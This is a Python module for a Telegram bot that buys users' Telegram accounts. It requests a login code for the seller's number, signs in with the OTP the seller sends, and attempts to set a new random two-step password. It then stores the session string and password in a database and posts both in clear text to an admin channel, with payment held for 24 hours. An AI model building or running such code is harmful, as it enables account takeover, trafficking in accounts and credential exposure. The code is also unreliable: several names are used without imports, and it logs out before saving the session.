import asyncio, html, random, string, re, os
from aiogram import F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder
from telethon import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime, timedelta, timezone

from config import ADMIN_IDS, LOG_CHANNEL, API_ID, API_HASH
from pymongo import MongoClient

# DB setup (reuse existing)
MONGO_URI = os.getenv("MONGO_URI")
client = MongoClient(MONGO_URI)
db = client["QuickCodes"]
users_col = db["users"]
countries_col = db["countries"]
sell_rates_col = db["sell_rates"]
sales_col = db["sales"]

class SellAccount(StatesGroup):
    waiting_number = State()

def register_sell_handlers(dp, bot):  # ✅ remove async
    @dp.callback_query(F.data == "sell")
    async def callback_sell(cq: CallbackQuery, state: FSMContext):
        rates = list(sell_rates_col.find({}))
        if not rates:
            return await cq.message.answer("❌ No sell rates set by admin yet.")
        msg_text = "📋 <b>Sell Rates:</b>\n\n"
        for r in rates:
            msg_text += f"{r['country']} ₹{r['price']}\n"
        msg_text += "\n💬 Send the <b>number</b> you want to sell (e.g., +14151234567)"
        await cq.message.answer(msg_text, parse_mode="HTML")
        await state.set_state(SellAccount.waiting_number)

    @dp.message(SellAccount.waiting_number)
    async def handle_sell_number(msg: Message, state: FSMContext):
        number = msg.text.strip()
        if not re.match(r"^\+\d{6,15}$", number):
            await state.clear()
            return await msg.answer("❌ Invalid number format. Use format like +14151234567")

        # Detect country code
        countries = list(sell_rates_col.find({}))
        detected_country = None
        for c in countries:
            if number.startswith(c.get("code", "")):
                detected_country = c["country"]
                price = c["price"]
                break

        if not detected_country:
            await state.clear()
            return await msg.answer("❌ Couldn't detect your country from number prefix.")

        # Create telethon session
        api_id = int(API_ID)
        api_hash = API_HASH
        session = StringSession()
        client = TelegramClient(session, api_id, api_hash)
        await client.connect()

        # Try to send code
        try:
            sent = await client.send_code_request(number)
            await msg.answer("📩 Code sent! Please check Telegram or SMS for OTP.")
            await state.update_data(session=session.save(), number=number, country=detected_country, price=price, phone_code_hash=sent.phone_code_hash)
            await client.disconnect()
            await state.set_state("waiting_sell_otp")

        except Exception as e:
            await client.disconnect()
            await msg.answer(f"❌ Error sending code: {e}")
            await state.clear()

    @dp.message(StateFilter("waiting_sell_otp"))
    async def handle_sell_otp(msg: Message, state: FSMContext):
        data = await state.get_data()
        session_str = data["session"]
        number = data["number"]
        country = data["country"]
        price = data["price"]
        phone_code_hash = data["phone_code_hash"]

        api_id = int(API_ID)
        api_hash = API_HASH
        client = TelegramClient(StringSession(session_str), api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(phone=number, code=msg.text.strip(), phone_code_hash=phone_code_hash)
            new_password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            try:
                await client(functions.account.UpdatePasswordSettingsRequest(
                    password=None,
                    new_settings=types.account.PasswordInputSettings(new_password=new_password)
                ))
            except:
                pass

            await client.log_out()
            string_session = client.session.save()
            await client.disconnect()

            # Save sale to DB
            sales_col.insert_one({
                "user_id": msg.from_user.id,
                "username": msg.from_user.username,
                "number": number,
                "country": country,
                "price": price,
                "string_session": string_session,
                "password": new_password,
                "status": "pending",
                "created_at": datetime.now(timezone.utc)
            })

            await msg.answer(f"✅ Your account listed successfully!\n\n💰 You'll receive ₹{price} in 24 hours after verification.")
            await state.clear()

            # Send to admin log
            log_text = (
                f"📢 <b>New Account Sell Request</b>\n\n"
                f"👤 User: @{msg.from_user.username or msg.from_user.id}\n"
                f"📞 Number: {number}\n"
                f"🌍 Country: {country}\n"
                f"🔑 Password: <code>{new_password}</code>\n"
                f"🧾 Price: ₹{price}\n\n"
                f"<b>StringSession:</b>\n<code>{string_session}</code>"
            )
            await bot.send_message(LOG_CHANNEL, log_text, parse_mode="HTML")

            # Schedule 24hr check
            asyncio.create_task(check_release_payment(bot, number))

        except Exception as e:
            await client.disconnect()
            await msg.answer(f"❌ Error verifying OTP: {e}")
            await state.clear()


async def check_release_payment(bot, number):
    await asyncio.sleep(86400)  # 24 hours
    sale = sales_col.find_one({"number": number, "status": "pending"})
    if not sale:
        return
    user_id = sale["user_id"]
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="✅ Approve", callback_data=f"approve_sell:{number}"),
        InlineKeyboardButton(text="❌ Reject", callback_data=f"reject_sell:{number}")
    )
    await bot.send_message(LOG_CHANNEL, f"⏰ 24h passed. Release payment for {number}?", reply_markup=kb.as_markup())
